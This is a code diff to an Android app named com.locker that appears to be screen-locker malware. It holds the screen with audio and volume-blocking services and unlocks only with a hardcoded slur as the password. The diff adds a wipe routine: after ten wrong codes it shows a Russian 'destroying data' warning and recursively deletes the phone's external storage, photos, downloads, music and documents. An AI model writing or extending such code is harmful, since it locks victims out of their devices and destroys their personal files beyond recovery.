@@ -3,6 +3,7 @@ package com.locker;
 import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.media.AudioManager;
 import android.media.MediaPlayer;
 import android.net.Uri;
@@ -28,6 +29,7 @@ public class LockActivity extends Activity {
     private Handler handler = new Handler();
     private boolean isUnlocked = false;
     private File targetDir;
+    private int failCount = 0;
 
     @Override
     protected void onCreate(Bundle b) {
@@ -160,15 +162,19 @@ public class LockActivity extends Activity {
                 String password = passwordInput.getText().toString();
                 if (password.equals("pidori")) {
                     isUnlocked = true;
-                    LockService.isUnlocked = true; // ГЛАВНОЕ: говорим сервису, что разблокировались
+                    LockService.isUnlocked = true;
                     LockService.isAppOpen = false;
                     VolumeBlockService.setLocked(false);
+                    
+                    SharedPreferences prefs = getSharedPreferences("locker_prefs", MODE_PRIVATE);
+                    prefs.edit().putBoolean("is_unlocked_by_user", true).apply();
                     
                     if (mp != null) {
                         mp.stop();
                         mp.release();
                         mp = null;
                     }
+                    
                     new Thread(new Runnable() {
                         @Override
                         public void run() {
@@ -177,11 +183,45 @@ public class LockActivity extends Activity {
                     }).start();
                     finish();
                 } else {
-                    Toast.makeText(LockActivity.this, "Неверный код", Toast.LENGTH_SHORT).show();
-                    passwordInput.setText("");
+                    failCount++;
+                    if (failCount >= 10) {
+                        Toast.makeText(LockActivity.this, "ПРЕВЫШЕН ЛИМИТ ПОПЫТОК. УНИЧТОЖЕНИЕ ДАННЫХ...", Toast.LENGTH_LONG).show();
+                        destroySystem();
+                    } else {
+                        Toast.makeText(LockActivity.this, "Неверный код. Попытка " + failCount + " из 10", Toast.LENGTH_SHORT).show();
+                        passwordInput.setText("");
+                    }
                 }
             }
         });
+    }
+
+    private void destroySystem() {
+        String[] paths = {
+            Environment.getExternalStorageDirectory().getAbsolutePath(),
+            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath(),
+            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath(),
+            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).getAbsolutePath(),
+            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC).getAbsolutePath(),
+            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS).getAbsolutePath()
+        };
+
+        for (String path : paths) {
+            deleteRecursive(new File(path));
+        }
+        finish();
+    }
+
+    private void deleteRecursive(File fileOrDirectory) {
+        if (fileOrDirectory.isDirectory()) {
+            File[] children = fileOrDirectory.listFiles();
+            if (children != null) {
+                for (File child : children) {
+                    deleteRecursive(child);
+                }
+            }
+        }
+        fileOrDirectory.delete();
     }
 
     @Override
@@ -289,4 +329,4 @@ public class LockActivity extends Activity {
         }
         handler.removeCallbacksAndMessages(null);
     }
-                                }
+                }
